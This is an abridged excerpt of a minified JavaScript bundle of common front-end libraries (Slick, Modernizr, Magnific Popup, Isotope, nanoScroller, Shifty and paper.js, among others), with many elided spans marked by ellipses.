            ...
            for (var l = 0; l < a.length;) {
                ...
                if (u && /svg/i.test(u.nodeName)) {
                    ...
                    if (n && (!s.validate || s.validate(c, u, h))) {
                        ...
                        if (f.length) {
                            var g = r[f];
                            g || ((g = r[f] = new XMLHttpRequest).open("GET", f), g.send(), g._embeds = []), g._embeds.push({
                                svg: u,
                                id: p
                            }), e(g)
...
function(t) {
    ...
    function l(n) {
        var s, o = n || window.event,
            ...
            p = 0,
            g = 0;
        if ((n = t.event.fix(o)).type = "mousewheel", "detail" in o && (f = -1 * o.detail), "wheelDelta" in o && (f = o.wheelDelta), "wheelDeltaY" in o && (f = o.wheelDeltaY), "wheelDeltaX" in o && (d = -1 * o.wheelDeltaX), "axis" in o && o.axis === o.HORIZONTAL_AXIS && (d = -1 * f, f = 0), c = 0 === f ? d : f, "deltaY" in o && (c = f = -1 * o.deltaY), "deltaX" in o && (d = o.deltaX, 0 === f && (c = -1 * d)), 0 !== f || 0 !== d) {
            if (1 === o.deltaMode) {
            ...
            if (s = Math.max(Math.abs(f), Math.abs(d)), (!i || s < i) && (i = s, u(o, s) && (i /= 40)), u(o, s) && (c /= 40, d /= 40, f /= 40), c = Math[c >= 1 ? "floor" : "ceil"](c / i), d = Math[d >= 1 ? "floor" : "ceil"](d / i), f = Math[f >= 1 ? "floor" : "ceil"](f / i), a.settings.normalizeOffset && this.getBoundingClientRect) {
                var _ = this.getBoundingClientRect();
                p = n.clientX - _.left, g = n.clientY - _.top
            }
            return n.deltaX = d, n.deltaY = f, n.deltaFactor = i, n.offsetX = p, n.offsetY = g, n.deltaMode = 0, l.unshift(n, c, d, f), e && clearTimeout(e), e = setTimeout(h, 200), (t.event.dispatch || t.event.handle).apply(this, l)
        }
    }
...
function(t) {
    ...
    e = 0, (i = function(i, n) {
        ...
        }!0 === n.options.centerMode ? !0 === n.options.infinite ? i = (e = n.currentSlide + (n.options.slidesToShow / 2 + 1)) + n.options.slidesToShow + 2 : (e = Math.max(0, n.currentSlide - (n.options.slidesToShow / 2 + 1)), i = n.options.slidesToShow / 2 + 1 + 2 + n.currentSlide) : (e = n.options.infinite ? n.options.slidesToShow + n.currentSlide : n.currentSlide, i = Math.ceil(e + n.options.slidesToShow), !0 === n.options.fade && (e > 0 && e--, i <= n.slideCount && i++)), s(n.$slider.find(".slick-slide").slice(e, i)), n.slideCount <= n.options.slidesToShow ? s(n.$slider.find(".slick-slide")) : n.currentSlide >= n.slideCount - n.options.slidesToShow ? s(n.$slider.find(".slick-cloned").slice(0, n.options.slidesToShow)) : 0 === n.currentSlide && s(n.$slider.find(".slick-cloned").slice(-1 * n.options.slidesToShow))
        ...
        var n, s, r, o, a, l, h = this;
        if (e = e || !1, (!0 !== h.animating || !0 !== h.options.waitForAnimate) && !(!0 === h.options.fade && h.currentSlide === t || h.slideCount <= h.options.slidesToShow))
            if (!1 === e && h.asNavFor(t), n = t, a = h.getLeft(n), o = h.getLeft(h.currentSlide), h.currentLeft = null === h.swipeLeft ? o : h.swipeLeft, !1 === h.options.infinite && !1 === h.options.centerMode && (t < 0 || t > h.getDotCount() * h.options.slidesToScroll)) !1 === h.options.fade && (n = h.currentSlide, !0 !== i ? h.animateSlide(o, function() {
                h.postSlide(n)
            }) : h.postSlide(n));
            else if (!1 === h.options.infinite && !0 === h.options.centerMode && (t < 0 || t > h.slideCount - h.options.slidesToScroll)) !1 === h.options.fade && (n = h.currentSlide, !0 !== i ? h.animateSlide(o, function() {
            h.postSlide(n)
        }) : h.postSlide(n));
        else {
            if (h.options.autoplay && clearInterval(h.autoPlayTimer), s = n < 0 ? h.slideCount % h.options.slidesToScroll != 0 ? h.slideCount - h.slideCount % h.options.slidesToScroll : h.slideCount + n : n >= h.slideCount ? h.slideCount % h.options.slidesToScroll != 0 ? 0 : n - h.slideCount : n, h.animating = !0, h.$slider.trigger("beforeChange", [h, h.currentSlide, s]), r = h.currentSlide, h.currentSlide = s, h.setSlideClasses(h.currentSlide), h.options.asNavFor && (l = (l = h.getNavTarget()).slick("getSlick")).slideCount <= l.options.slidesToShow && l.setSlideClasses(h.currentSlide), h.updateDots(), h.updateArrows(), !0 === h.options.fade) return !0 !== i ? (h.fadeSlideOut(r), h.fadeSlide(s, function() {
                h.postSlide(s)
        ...
        var t, e, n = this,
            ...
            o = n.length;
        for (t = 0; t < o; t++)
            if ("object" == typeof s || void 0 === s ? n[t].slick = new i(n[t], s) : e = n[t].slick[s].apply(n[t].slick, r), void 0 !== e) return e;
        return n
    }
}),
function() {
    ...
    r.prototype.add = function(t) {
        ...
        for (var r in this.handleScroll(), t = {
            ...
            for (var a in this.waypoints[r]) {
                var l, h, u, c, d = this.waypoints[r][a],
                    f = d.options.offset,
                    p = d.triggerPoint,
                    g = 0,
                    v = null == p;
                d.element !== d.element.window && (g = d.adapter.offset()[o.offsetProp]), "function" == typeof f ? f = f.apply(d) : "string" == typeof f && (f = parseFloat(f), d.options.offset.indexOf("%") > -1 && (f = Math.ceil(o.contextDimension * f / 100))), l = o.contextScroll - o.contextOffset, d.triggerPoint = Math.floor(g + l - f), h = p < o.oldScroll, u = d.triggerPoint >= o.oldScroll, c = !h && !u, !v && (h && u) ? (d.queueTrigger(o.backward), s[d.group.id] = d.group) : !v && c ? (d.queueTrigger(o.forward), s[d.group.id] = d.group) : v && o.oldScroll >= d.triggerPoint && (d.queueTrigger(o.forward), s[d.group.id] = d.group)
            }
        }
    ...
    t.fn.counterUp = function(e) {
        ...
        return this.each(function() {
            ...
            e.waypoint(function() {
                ...
                s = s.replace(/,/g, "");
                /^[0-9]+$/.test(s);
                for (var o = /^[0-9]+\.[0-9]+$/.test(s), a = o ? (s.split(".")[1] || []).length : 0, l = i; l >= 1; l--) {
                    var h = parseInt(s / i * l);
                    if (o && (h = parseFloat(s / i * l).toFixed(a)), r)
                        for (;
...
function(t) {
    ...
    return function t(e, i, n) {
        ...
        function o(t, e, n) {
            ...
            return s(e, "string") || s(e, "undefined") ? r(a, e) : function(t, e, n) {
                for (var r in t) {
                    var o = e[t[r]];
        ...
        var a, l, h = {},
            ...
            w = y.slice,
            x = function(t, i, n, s) {
                var r, o, a, l, h = e.createElement("div"),
                    d = e.body,
                    f = d || e.createElement("body");
                if (parseInt(n, 10))
                    for (; n--;)(a = e.createElement("div")).id = s ? s[n] : c + (n + 1), h.appendChild(a);
                return r = ["&#173;", '<style id="s', c, '">', t, "</style>"].join(""), h.id = c, (d ? h : f).innerHTML += r, f.appendChild(h), d || (f.style.background = "", f.style.overflow = "hidden", l = u.style.overflow, u.style.overflow = "hidden", u.appendChild(f)), o = i(h, t), d ? h.parentNode.removeChild(h) : (f.parentNode.removeChild(f), u.style.overflow = l), !!o
            },
            b = {}.hasOwnProperty;
        for (var S in l = s(b, "undefined") || s(b.call, "undefined") ? function(t, e) {
                ...
                var i;
                return "ontouchstart" in t || t.DocumentTouch && e instanceof DocumentTouch ? i = !0 : x(["@media (", p.join("touch-enabled),("), c, ")", "{#modernizr{top:9px;position:absolute}}"].join(""), function(t) {
                    i = 9 === t.offsetTop
                }), i
                ...
                return o("transition")
            }, _) l(_, S) && (a = S.toLowerCase(), h[a] = _[S](), y.push((h[a] ? "" : "no-") + a));
        return h.addTest = function(t, e) {
                if ("object" == typeof t)
                    for (var n in t) l(t, n) && h.addTest(n, t[n]);
                else {
            ...
            function(t, e) {
                ...
                function s(t, i, s) {
                    return i || (i = e), a ? i.createElement(t) : (s || (s = n(i)), (r = s.cache[t] ? s.cache[t].cloneNode() : u.test(t) ? (s.cache[t] = s.createElem(t)).cloneNode() : s.createElem(t)).canHaveChildren && !h.test(t) ? s.frag.appendChild(r) : r);
                    var r
                }

                function r(t) {
                    t || (t = e);
                    var r, l, h, u, c, d, f = n(t);
                    return p.shivCSS && !o && !f.hasCSS && (f.hasCSS = (u = "article,aside,figcaption,figure,footer,header,hgroup,nav,section{display:block}mark{background:#FF0;color:#000}", c = (h = t).createElement("p"), d = h.getElementsByTagName("head")[0] || h.documentElement, c.innerHTML = "x<style>" + u + "</style>", !!d.insertBefore(c.lastChild, d.firstChild))), a || (r = t, (l = f).cache || (l.cache = {}, l.createElem = r.createElement, l.createFrag = r.createDocumentFragment, l.frag = l.createFrag()), r.createElement = function(t) {
                        return p.shivMethods ? s(t, r, l) : l.createElem(t)
                    }, r.createDocumentFragment = Function("h,f", "return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&(" + i().join().replace(/\w+/g, function(t) {
                ...
                t.html5 = p, r(e)
            }(this, e), h._version = "2.6.2", h._prefixes = p, h._domPrefixes = m, h._cssomPrefixes = v, h.testProp = function(t) {
                return r([t])
            }, h.testAllProps = o, h.testStyles = x, h.prefixed = function(t, e, i) {
                return e ? o(t, e, i) : o(t, "pfx")
            }, u.className = u.className.replace(/(^|\s)no-js(\s|$)/, "$1$2") + " js " + y.join(" "), h
    }(this, this.document),
    function(t, e, i) {
        function n(t) {
        ...
        function l(t, i, n, r, l) {
            return m = 0, i = i || "j", s(t) ? function(t, i, n, s, r, l, h) {
                ...
                1 === T[i] && (_ = 1, T[i] = []), "object" == t ? d.data = i : (d.src = i, d.type = t), d.width = d.height = "0", d.onerror = d.onload = d.onreadystatechange = function() {
                    u.call(this, _)
                }, v.splice(s, 0, x), "img" != t && (_ || 2 === T[i] ? (w.insertBefore(d, y ? null : p), f(u, h)) : T[i].push(d))
            }("c" == i ? b : x, t, i, this.i++, n, r, l) : (v.splice(this.i++, 0, t), 1 == v.length && a()), this
        }
        ...
        (c = function(t) {
            function e(t, e, s, r, o) {
                var a = function(t) {
                        ...
                        for (r = {
                                ...
                                origUrl: r,
                                prefixes: t
                            }, i = 0; i < o; i++) n = t[i].split("="), (e = k[n.shift()]) && (r = e(r, n));
                        for (i = 0; i < s; i++) r = C[i](r);
                        return r
                    }(t),
                    l = a.autoCallback;
                a.url.split(".").pop().split("?").shift(), a.bypass || (e && (e = n(e) ? e : e[t] || e[r] || e[t.split("/").pop().split("?")[0]]), a.instead ? a.instead(t, e, s, r, o) : (T[a.url] ? a.noexec = !0 : T[a.url] = 1, s.load(a.url, a.forceCSS || !a.forceJS && "css" == a.url.split(".").pop().split("?").shift() ? "c" : i, a.noexec, a.attrs, a.timeout), (n(e) || n(l)) && s.load(function() {
                    ...
                    if (t) {
                        if (s(t)) r || (c = function() {
                            ...
                            for (l in a = function() {
                                    ...
                                    return i
                                }(), t) t.hasOwnProperty(l) && (!r && !--a && (n(c) ? c = function() {
                                var t = [].slice.call(arguments);
                                d.apply(this, t), f()
                            } : c[l] = function(t) {
                                return function() {
            ...
            if (s(t)) e(t, 0, u, 0);
                ...
                for (a = 0; a < t.length; a++) s(l = t[a]) ? e(l, 0, u, 0) : S(l) ? c(l) : Object(l) === l && o(l, u);
            else Object(t) === t && o(t, u)
        }).addPrefix = function(t, e) {
            k[t] = e
        }, c.addFilter = function(t) {
            C.push(t)
        }, c.errorTimeout = 1e4, null == e.readyState && e.addEventListener && (e.readyState = "loading", e.addEventListener("DOMContentLoaded", u = function() {
            e.removeEventListener("DOMContentLoaded", u, 0), e.readyState = "complete"
        }, 0)), t.yepnope = h(), t.yepnope.executeStack = a, t.yepnope.injectJs = function(t, i, n, s, l, h) {
            var u, d, g = e.createElement("script");
            s = s || c.errorTimeout;
            for (d in g.src = t, n) g.setAttribute(d, n[d]);
            i = h ? a : i || r, g.onreadystatechange = g.onload = function() {
                !u && o(g.readyState) && (u = 1, i(), g.onload = g.onreadystatechange = null)
            }, f(function() {
                u || (u = 1, i(1))
            }, s), l ? g.onload() : p.parentNode.insertBefore(g, p)
        ...
        t.DLMenu = function(e, i) {
            ...
            _initEvents: function() {
                ...
                this.$trigger.on("click.dlmenu", function() {
                    return e.open ? e._closeMenu() : (e._openMenu(), s.off("click").children().on("click.dlmenu", function() {
                        e._closeMenu()
                    })), !1
                    ...
                    if (s.length > 0 && !t(i.currentTarget).hasClass("dl-subviewopen")) {
                        var r = s.clone().css("opacity", 0).insertAfter(e.$menu),
                            o = function() {
                                e.$menu.off(e.animEndEventName).removeClass(e.options.animationClasses.classout).addClass("dl-subview"), n.addClass("dl-subviewopen").parents(".dl-subviewopen:first").removeClass("dl-subviewopen").addClass("dl-subview"), r.remove()
                            };
                        return setTimeout(function() {
                            r.addClass(e.options.animationClasses.classin), e.$menu.addClass(e.options.animationClasses.classout), e.supportAnimations ? e.$menu.on(e.animEndEventName, o) : o.call(), e.options.onLevelClick(n, n.children("a:first").text())
                        }), !1
                    }
    ...
    function(t) {
        ...
        g.prototype = {
            ...
            open: function(i) {
                ...
                if (!e.isOpen) {
                    e.types = [], r = "", i.mainEl && i.mainEl.length ? e.ev = i.mainEl.eq(0) : e.ev = n, i.key ? (e.popupsCache[i.key] || (e.popupsCache[i.key] = {}), e.currTemplate = e.popupsCache[i.key]) : e.currTemplate = {}, e.st = t.extend(!0, {}, t.magnificPopup.defaults, i), e.fixedContentPos = "auto" === e.st.fixedContentPos ? !e.probablyMobile : e.st.fixedContentPos, e.st.modal && (e.st.closeOnContentClick = !1, e.st.closeOnBgClick = !1, e.st.showCloseBtn = !1, e.st.enableEscapeKey = !1), e.bgOverlay || (e.bgOverlay = y("bg").on("click" + c, function() {
                        e.close()
                    }), e.wrap = y("wrap").attr("tabindex", -1).on("click" + c, function(t) {
                    ...
                    w("BeforeOpen"), e.st.showCloseBtn && (e.st.closeBtnInside ? (_(h, function(t, e, i, n) {
                        i.close_replaceWith = x(n.type)
                    }), r += " mfp-close-btn-in") : e.wrap.append(x())), e.st.alignTop && (r += " mfp-align-top"), e.fixedContentPos ? e.wrap.css({
                        ...
                        height: n.height(),
                        position: "absolute"
                    }), e.st.enableEscapeKey && n.on("keyup" + c, function(t) {
                    ...
                    return e.isIE7 && (b += " mfp-ie7"), b && e._addClassToMFP(b), e.updateItemHTML(), w("BuildControls"), t("html").css(g), e.bgOverlay.add(e.wrap).prependTo(e.st.prependTo || t(document.body)), e._lastFocusedEl = document.activeElement, setTimeout(function() {
                        e.content ? (e._addClassToMFP(d), e._setFocus()) : e.bgOverlay.addClass(d), n.on("focusin" + c, e._onFocusIn)
                    }, 16), e.isOpen = !0, e.updateSize(p), w(u), i
                }
                e.updateItemHTML()
            },
            close: function() {
            ...
            updateStatus: function(t, n) {
                if (e.preloader) {
                    ...
                    w("UpdateStatus", s), t = s.status, n = s.text, e.preloader.html(n), e.preloader.find("a").on("click", function(t) {
                ...
                getAjax: function(i) {
                    ...
                    var n = t.extend({
                        ...
                        success: function(n, s, r) {
                            ...
                            w("ParseAjax", o), e.appendContent(t(o.data), P), i.finished = !0, M(), e._setFocus(), setTimeout(function() {
                                e.wrap.addClass(d)
        ...
        t.magnificPopup.registerModule("image", {
            ...
            proto: {
                ...
                getImage: function(i, n) {
                    var s = 0,
                        r = function() {
                            i && (i.img[0].complete ? (i.img.off(".mfploader"), i === e.currItem && (e._onImageHasSize(i), e.updateStatus("ready")), i.hasSize = !0, i.loaded = !0, w("ImageLoadComplete")) : ++s < 200 ? setTimeout(r, 100) : o())
                        },
                        o = function() {
                    ...
                    if (i.enabled && e.supportsTransition) {
                        ...
                        _("BuildControls" + n, function() {
                            if (e._allowZoom()) {
                                ...
                                (r = h(t)).css(e._getOffset()), e.wrap.append(r), s = setTimeout(function() {
        ...
        t.magnificPopup.registerModule(L, {
            ...
            proto: {
                initIframe: function() {
                    e.types.push(L), _("BeforeChange", function(t, e, i) {
                        e !== i && (e === L ? $() : i === L && $(!0))
                    }), _(a + "." + L, function() {
                        $()
                    })
    ...
    function(t, e) {
        ...
        function n(t, e, s) {
            return this instanceof n ? ("string" == typeof t && (t = document.querySelectorAll(t)), this.elements = function(t) {
                ...
                return e
            }(t), this.options = i({}, this.options), "function" == typeof e ? s = e : i(this.options, e), s && this.on("always", s), this.getImages(), o && (this.jqDeferred = new o.Deferred), void setTimeout(function() {
                this.check()
        ...
        function r(n, r, a) {
            (a = a || e || t.jQuery) && (r.prototype.option || (r.prototype.option = function(t) {
                ...
                if ("string" == typeof t) {
                    ...
                    return h = e, c = "$()." + n + '("' + (l = t) + '")', (o = this).each(function(t, e) {
                        var i = a.data(e, n);
                        if (i) {
                            var r = i[l];
                            if (r && "_" != l.charAt(0)) {
        ...
        return i.htmlInit = function(e, s) {
            i.docReady(function() {
                ...
                h.forEach(function(t) {
                    var i, r = t.getAttribute(o) || t.getAttribute(u);
                    try {
                        i = r && JSON.parse(r)
                    } catch (e) {
    ...
    function(t, e) {
        ...
        n.extend(c, e.prototype), c.option = function(t) {
            ...
            var i = d(u);
            return i.defaults = n.extend({}, u.defaults), n.extend(i.defaults, e), i.compatOptions = n.extend({}, u.compatOptions), i.namespace = t, i.data = u.data, i.Item = d(s), n.htmlInit(i, t), o && o.bridget && o.bridget(t, i), i
        };
        var f = {
            ms: 1,
            s: 1e3
    ...
    function(t, e) {
        ...
        return i.compatOptions.fitWidth = "isFitWidth", i.prototype._resetLayout = function() {
            ...
            for (var n = this._getColGroup(i), s = Math.min.apply(Math, n), r = n.indexOf(s), o = {
                    x: this.columnWidth * r,
                    y: s
                }, a = s + t.size.outerHeight, l = this.cols + 1 - n.length, h = 0; h < l; h++) this.colYs[r + h] = a;
            return o
    ...
    function(t, e) {
        "function" == typeof define && define.amd ? define(["outlayer/outlayer", "get-size/get-size", "desandro-matches-selector/matches-selector", "fizzy-ui-utils/utils", "isotope/js/item", "isotope/js/layout-mode", "isotope/js/layout-modes/masonry", "isotope/js/layout-modes/fit-rows", "isotope/js/layout-modes/vertical"], function(i, n, s, r, o, a) {
        ...
        h.sortDataParsers = {
            ...
            if (t) {
                var e, i, n = [].concat.apply(t, this.sortHistory),
                    s = (e = n, i = this.options.sortAscending, function(t, n) {
    ...
    function(t) {
        ...
        _ = {
            ...
            windowContext: null
        }, p = "scroll", a = "mousedown", l = "mouseenter", h = "mousemove", c = "mousewheel", u = "mouseup", f = "resize", v = "up", r = "DOMMouseScroll", o = "down", g = "touchmove", n = "Microsoft Internet Explorer" === e.navigator.appName && /msie 7./i.test(e.navigator.appVersion) && e.ActiveXObject, s = null, b = e.requestAnimationFrame, m = e.cancelAnimationFrame, C = i.createElement("div").style, T = function() {
            var t, e, i, n;
            for (t = i = 0, n = (e = ["t", "webkitT", "MozT", "msT", "OT"]).length; i < n; t = ++i)
                if (e[t], e[t] + "ransform" in C) return e[t].substr(0, e[t].length - 1);
            return !1
        }(), S = function(t) {
            return !1 !== T && ("" === T ? t : T + t.charAt(0).toUpperCase() + t.substr(1))
        }("transform"), w = !1 !== S, y = function() {
            var t, e, n;
            return (e = (t = i.createElement("div")).style).position = "absolute", e.width = "100px", e.height = "100px", e.overflow = p, e.top = "-9999px", i.body.appendChild(t), n = t.offsetWidth - t.clientWidth, i.body.removeChild(t), n
        }, x = function() {
            var t, i, n;
            return i = e.navigator.userAgent, !!(t = /(?=.+Mac OS X)(?=.+Firefox)/.test(i)) && ((n = /Firefox\/\d{2}\./.exec(i)) && (n = n[0].replace(/\D+/g, "")), t && +n > 23)
        }, d = function() {
            function d(n, r) {
                this.el = n, this.options = r, s || (s = y()), this.$el = t(this.el), this.doc = t(this.options.documentContext || i), this.win = t(this.options.windowContext || e), this.body = this.doc.find("body"), this.$content = this.$el.children("." + this.options.contentClass), this.$content.attr("tabindex", this.options.tabIndex || 0), this.content = this.$content[0], this.previousPosition = 0, this.options.iOSNativeScrolling && null != this.el.style.WebkitOverflowScrolling ? this.nativeScrolling() : this.generate(), this.createEvents(), this.addEvents(), this.reset()
            }
            return d.prototype.preventScrolling = function(t, e) {
                if (this.isActive)
                ...
                var t, e;
                w ? (t = {})[S] = "translate(0, " + this.sliderTop + "px)" : t = {
                    top: this.sliderTop
                }, b ? (m && this.scrollRAF && m(this.scrollRAF), this.scrollRAF = b((e = this, function() {
                    return e.scrollRAF = null, e.slider.css(t)
                }))) : this.slider.css(t)
            }, d.prototype.createEvents = function() {
                var t, e, i, n, s, r, a, c;
                this.events = {
                    down: (c = this, function(t) {
                        return c.isBeingDragged = !0, c.offsetY = t.pageY - c.slider.offset().top, c.slider.is(t.target) || (c.offsetY = 0), c.pane.addClass(c.options.activeClass), c.doc.bind(h, c.events.drag).bind(u, c.events.up), c.body.bind(l, c.events.enter), !1
                    }),
                    ...
                    resize: (s = this, function(t) {
                        s.reset()
                    }),
                    panedown: (n = this, function(t) {
                        return n.sliderY = (t.offsetY || t.originalEvent.layerY) - .5 * n.sliderHeight, n.scroll(), n.events.down(t), !1
                    }),
                    scroll: (i = this, function(t) {
                        i.updateScrollValues(), i.isBeingDragged || (i.iOSNativeScrolling || (i.sliderY = i.sliderTop, i.setOnScrollStyles()), null != t && (i.contentScrollTop >= i.maxScrollTop ? (i.options.preventPageScrolling && i.preventScrolling(t, o), i.prevScrollTop !== i.maxScrollTop && i.$el.trigger("scrollend")) : 0 === i.contentScrollTop && (i.options.preventPageScrolling && i.preventScrolling(t, v), 0 !== i.prevScrollTop && i.$el.trigger("scrolltop"))))
                    }),
                ...
                var t;
                this.removeEvents(), t = this.events, this.options.disableResize || this.win.bind(f, t[f]), this.iOSNativeScrolling || (this.slider.bind(a, t[o]), this.pane.bind(a, t.panedown).bind(c + " " + r, t.wheel)), this.$content.bind(p + " " + c + " " + r + " " + g, t[p])
                ...
                var t, i, n, r, o;
                return r = (i = this.options).paneClass, o = i.sliderClass, i.contentClass, (n = this.$el.children("." + r)).length || n.children("." + o).length || this.$el.append('<div class="' + r + '"><div class="' + o + '" /></div>'), this.pane = this.$el.children("." + r), this.slider = this.pane.find("." + o), 0 === s && x() ? t = {
                    right: -14,
                ...
                if (!this.iOSNativeScrolling) return this.$el.find("." + this.options.paneClass).length || this.generate().stop(), this.stopped && this.restore(), o = (r = (t = this.content).style).overflowY, n && this.$content.css({
                    height: this.$content.height()
                }), e = t.scrollHeight + s, (u = parseInt(this.$el.css("max-height"), 10)) > 0 && (this.$el.height(""), this.$el.height(t.scrollHeight > u ? u : t.scrollHeight)), l = (a = this.pane.outerHeight(!1)) + (h = parseInt(this.pane.css("top"), 10)) + parseInt(this.pane.css("bottom"), 10), (d = Math.round(l / e * a)) < this.options.sliderMinHeight ? d = this.options.sliderMinHeight : null != this.options.sliderMaxHeight && d > this.options.sliderMaxHeight && (d = this.options.sliderMaxHeight), o === p && r.overflowX !== p && (d += s), this.maxSliderTop = l - d, this.contentHeight = e, this.paneHeight = a, this.paneOuterHeight = l, this.sliderHeight = d, this.paneTop = h, this.slider.height(d), this.events.scroll(), this.pane.show(), this.isActive = !0, t.scrollHeight === t.clientHeight || this.pane.outerHeight(!0) >= t.scrollHeight && o !== p ? (this.pane.hide(), this.isActive = !1) : this.el.clientHeight === t.scrollHeight && o === p ? this.slider.hide() : this.slider.show(), this.pane.css({
                    opacity: this.options.alwaysVisible ? 1 : "",
                    visibility: this.options.alwaysVisible ? "visible" : ""
                }), "static" !== (i = this.$content.css("position")) && "relative" !== i || (c = parseInt(this.$content.css("right"), 10)) && this.$content.css({
                    right: "",
                    marginRight: c
                }), this;
                ...
                return this.stopped || this.stop(), !this.iOSNativeScrolling && this.pane.length && this.pane.remove(), n && this.$content.height(""), this.$content.removeAttr("tabindex"), this.$el.hasClass(this.options.enabledClass) && (this.$el.removeClass(this.options.enabledClass), this.$content.css({
                    right: ""
                })), this
    ...
    function(t) {
        ...
        return function t(e, i, n) {
            ...
            1: [function(t, e, i) {
                (function() {
                    var t, n = this || Function("return this")(),
                        s = function() {
                            "use strict";
                            ...
                            function u(t, e, i, n, s, r, o, l, u, c, d) {
                                g = e + i + n, v = Math.min(d || b(), g), m = v >= g, _ = n - (g - v), t.isPlaying() && (m ? (u(o, t._attachment, _), t.stop(!0)) : (t._scheduleId = c(t._timeoutHandler, w), h(t, "beforeTween"), v < e + i ? a(1, s, r, o, 1, 1, l) : a(v, s, r, o, n, e + i, l), h(t, "afterTween"), u(s, t._attachment, _)))
                            }
                            ...
                            var f, p, g, v, m, _, y = "linear",
                                w = 1e3 / 60,
                                x = Date.now ? Date.now : function() {
                                    return +new Date
                                },
                                b = "undefined" != typeof SHIFTY_DEBUG_NOW ? SHIFTY_DEBUG_NOW : x;
                            return p = "undefined" != typeof window && (window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || window.mozCancelRequestAnimationFrame && window.mozRequestAnimationFrame) || setTimeout, d.prototype.tween = function(t) {
                                ...
                                return this._isTweening = !1, this._isPaused = !1, this._timeoutHandler = t, (n.cancelAnimationFrame || n.webkitCancelAnimationFrame || n.oCancelAnimationFrame || n.msCancelAnimationFrame || n.mozCancelRequestAnimationFrame || n.clearTimeout)(this._scheduleId), e && (h(this, "beforeTween"), a(1, this._currentState, this._originalState, this._targetState, 1, 0, this._easing), h(this, "afterTween"), h(this, "afterTweenEnd"), this._finish.call(this, this._currentState, this._attachment)), this
                            ...
                            }, d.prototype.filter = {}, f = d.prototype.formula = {
                                linear: function(t) {
                                    return t
                                }
                            }, r(d, {
                            ...
                            }), "function" == typeof SHIFTY_DEBUG_NOW && (n.timeoutHandler = u), "object" == typeof i ? e.exports = d : void 0 === n.Tweenable && (n.Tweenable = d), d
                        }();
                    s.shallowCopy(s.prototype.formula, {
                        ...
                        function() {
                            function t(t, e, i, n, s, r) {
                                ...
                                var l, h = 0,
                                    ...
                                    f = 0,
                                    p = 0;
                                return h = 1 - (c = 3 * e) - (u = 3 * (n - e) - c), d = 1 - (p = 3 * i) - (f = 3 * (s - i) - p), l = function(t, e) {
                                    var i, n, s, r, l, d, f;
                                    for (s = t, d = 0; d < 8; d++) {
                                    ...
                                    return s
                                }(t, 1 / (200 * r)), ((d * l + f) * l + p) * l
                            }
                            s.setBezierFunction = function(e, i, n, r, o) {
                                var a, l, h, u, c = (a = i, l = n, h = r, u = o, function(e) {
                        ...
                        }(), (t = new s)._filterArgs = [], s.interpolate = function(e, i, n, r, o) {
                            ...
                            var c, d, f, p, g, v, m = (c = e, d = a, f = i, p = n, g = h, v = l, s.tweenProps(p, d, c, f, 1, v, g));
                        ...
                        function(t) {
                            ...
                            function i(t) {
                                var e, i = (3 === (e = (e = t).replace(/#/, "")).length && (e = (e = e.split(""))[0] + e[0] + e[1] + e[1] + e[2] + e[2]), m[0] = n(e.substr(0, 2)), m[1] = n(e.substr(2, 2)), m[2] = n(e.substr(4, 2)), m);
                            ...
                            function s(t, e, i) {
                                var n = e.match(t),
                                    s = e.replace(t, v);
                                if (n)
                                    for (var r, o = n.length, a = 0; a < o; a++) r = n.shift(), s = s.replace(v, i(r));
                                return s
                            }
                            ...
                            function l(e, i) {
                                t.each(i, function(t) {
                                    ...
                                    n = function(t, e) {
                                        ...
                                        return i
                                    }(i[t].formatString, o), e[t] = s(f, n, r)
                                })
                            }
                            ...
                            t.prototype.filter.token = {
                                ...
                                beforeTween: function(e, i, n, s) {
                                    var r, o;
                                    r = s, o = this._tokenData, t.each(o, function(t) {
                                        var e, i = o[t].chunkNames,
                                            n = i.length,
                                            s = r[t];
                                        if ("string" == typeof s) {
                                            var a = s.split(" "),
                                            ...
                                            for (e = 0; e < n; e++) r[i[e]] = s;
                                        delete r[t]
                                    }), a(e, this._tokenData), a(i, this._tokenData), a(n, this._tokenData)
                                },
                                afterTween: function(e, i, n, s) {
                                    var r, o;
                                    l(e, this._tokenData), l(i, this._tokenData), l(n, this._tokenData), r = s, o = this._tokenData, t.each(o, function(t) {
            ...
            2: [function(t, e, i) {
                ...
                (r.prototype = new n).constructor = r, r.prototype._pathString = function(t) {
                    var e = t.strokeWidth;
            ...
            3: [function(t, e, i) {
                ...
                (r.prototype = new n).constructor = r, r.prototype._initializeSvg = function(t, e) {
            ...
            6: [function(t, e, i) {
                ...
                (o.prototype = new n).constructor = o, o.prototype._initializeSvg = function(t, e) {
...
var paper = function(t, e) {
        ...
        s = new function() {
            var t = /^(statics|enumerable|beans|preserve)$/,
                ...
                h = function(t, e, i) {
                    if (t) {
                        var n = r(t, "length");
                        (n && "number" == typeof n.value ? a : function(t, e) {
            ...
            function u(e, i, n, s, a) {
                ...
                function h(t, h) {
                    ...
                    var u, d = "function" == typeof h,
                        f = h,
                        p = a || d && !h.base ? h && h.get ? t in e : e[t] : null;
                    a && p || (d && p && (h.base = p), d && !1 !== s && (u = t.match(/^([gs]et|is)(([A-Z])(.*))$/)) && (l[u[3].toLowerCase() + u[4]] = u[2]), f && !d && f.get && "function" == typeof f.get && c.isPlainObject(f) || (f = {
                        value: f,
                        writable: !0
                    }), (r(e, t) || {
                        configurable: !0
                    }).configurable && (f.configurable = !0, f.enumerable = null != n ? n : !u), o(e, t, f))
                }
                if (i) {
            ...
            return u(c, {
                ...
                extend: function() {
                    ...
                    }).prototype = e || s(this.prototype), o(e, "constructor", {
                        value: t,
                        writable: !0,
                        configurable: !0
                    }), u(t, this), arguments.length && this.inject.apply(t, arguments), t.base = n, t
                }
            }).inject({
                enumerable: !1,
                initialize: c,
    ...
    "undefined" != typeof module && (module.exports = s), s.inject({
        enumerable: !1,
        toString: function() {
            return null != this._id ? (this._class || "Object") + (this._name ? " '" + this._name + "'" : " @" + this._id) : "{ " + s.each(this, function(t, e) {
                if (!/^_/.test(e)) {
                    var i = typeof t;
        ...
        statics: {
            ...
            deserialize: function(t, e, i, n, r) {
                ...
                if (i = i || {}, Array.isArray(t)) {
                    ...
                    for (var p in o = {}, n && (i.dictionary = o), t) o[p] = s.deserialize(t[p], e, i);
                return l ? o[1] : o
            },
    ...
    var r = {
            on: function(t, e) {
                if ("string" != typeof t) s.each(t, function(t, e) {
                    this.on(e, t)
                }, this);
                else {
                ...
                inject: function t(e) {
                    ...
                    if (i) {
                        ...
                        s.each(i, function(t, i) {
                            ...
